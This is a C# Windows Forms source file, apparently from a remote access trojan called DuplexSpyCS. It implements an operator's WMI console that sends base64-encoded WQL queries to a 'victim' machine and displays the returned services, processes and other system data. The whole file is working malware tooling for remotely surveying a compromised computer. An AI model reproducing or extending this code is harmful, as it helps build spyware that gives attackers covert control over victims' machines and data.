using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmWMI : Form
    {
        public clsVictim v;
        private int idx_prompt;

        private Dictionary<string, string> m_dicQuickQuery = new Dictionary<string, string>()
        {
            {
                "Win32_Service",
                "Select * from Win32_Service"
            },
            {
                "Win32_Process",
                "Select * from Win32_Process"
            }
        };

        public frmWMI(clsVictim victim)
        {
            InitializeComponent();

            v = victim;
        }

        public void ShowOutput(DataTable dtInput)
        {
            if (dtInput == null || dtInput.Columns.Count == 0)
                return;

            int nColCount = dtInput.Columns.Count;
            int nRowCount = dtInput.Rows.Count;

            //Store column names
            List<string> lsColumns = new List<string>();
            foreach (DataColumn dc in dtInput.Columns)
                lsColumns.Add(dc.ColumnName);

            //Store row values
            List<string[]> lsRows = new List<string[]>();
            foreach (DataRow dr in dtInput.Rows)
            {
                string[] arrRow = new string[nColCount];
                for (int i = 0; i < nColCount; i++)
                    arrRow[i] = dr[i]?.ToString() ?? string.Empty;

                lsRows.Add(arrRow);
            }

            //Calculate max width of each column
            int[] arrColWidth = new int[nColCount];
            for (int i = 0; i < nColCount; i++)
                arrColWidth[i] = lsColumns[i].Length;

            for (int i = 0; i < lsRows.Count; i++)
            {
                for (int j = 0; j < nColCount; j++)
                {
                    int nLen = lsRows[i][j].Length;
                    if (nLen > arrColWidth[j])
                        arrColWidth[j] = nLen;
                }
            }

            //Build format string for aligned output
            string[] arrFormats = Enumerable
                .Range(0, nColCount)
                .Select(i => "{" + i + "," + arrColWidth[i] + "}")
                .ToArray();

            string szFormat = string.Join(" | ", arrFormats);

            //Build separator line
            string szSeparator = string.Join(
                " + ",
                Enumerable.Range(0, nColCount)
                    .Select(i => new string('-', arrColWidth[i]))
            );

            Invoke(new Action(() =>
            {
                //Print column header
                richTextBox1.AppendText(string.Format(szFormat, lsColumns.ToArray()));
                richTextBox1.AppendText(Environment.NewLine);

                //Print separator
                richTextBox1.AppendText(szSeparator);
                richTextBox1.AppendText(Environment.NewLine);

                //Print rows
                foreach (string[] arrRow in lsRows)
                {
                    richTextBox1.AppendText(string.Format(szFormat, arrRow));
                    richTextBox1.AppendText(Environment.NewLine);
                }

                //Print prompt
                richTextBox1.AppendText("> ");
                idx_prompt = richTextBox1.Text.Length;
            }));
        }

        void ProcessInput()
        {
            int idx_current = richTextBox1.Text.Length;
            string query = richTextBox1.Text[idx_prompt..idx_current];
            v.fnSendCommand("wmi|" + clsCrypto.b64E2Str(query));
        }

        void fnConsoleClear()
        {
            richTextBox1.Clear();

            richTextBox1.AppendText("> ");
            idx_prompt = richTextBox1.Text.Length;
        }

        void setup()
        {
            foreach (var key in m_dicQuickQuery.Keys)
                toolStripComboBox1.Items.Add(key);

            toolStripComboBox1.SelectedIndex = 0;
            toolStripComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;

            fnConsoleClear();
        }

        private void frmWMI_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                ProcessInput();
            }
            else if ((e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back) && richTextBox1.SelectionStart == idx_prompt)
            {
                e.Handled = true;
            }
        }

        private void richTextBox1_SelectionChanged(object sender, EventArgs e)
        {
            int sel = richTextBox1.SelectionStart;
            richTextBox1.SelectionStart = sel < idx_prompt ? idx_prompt : sel;
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            setup();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Text file (*.txt)|*.txt";
            sfd.FileName = $"result_{clsTools.GenerateFileName("txt")}";

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, richTextBox1.Text);
            }
        }

        private void toolStripComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            richTextBox1.Text = richTextBox1.Text.Substring(0, idx_prompt);

            List<string> lsValue = m_dicQuickQuery.Select(x => x.Value).ToList();
            richTextBox1.AppendText(" " + lsValue[toolStripComboBox1.SelectedIndex]);

            richTextBox1.SelectionStart = richTextBox1.Text.Length + 1;
            richTextBox1.SelectionLength = 0;
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\WQL").Show();
        }
    }
}
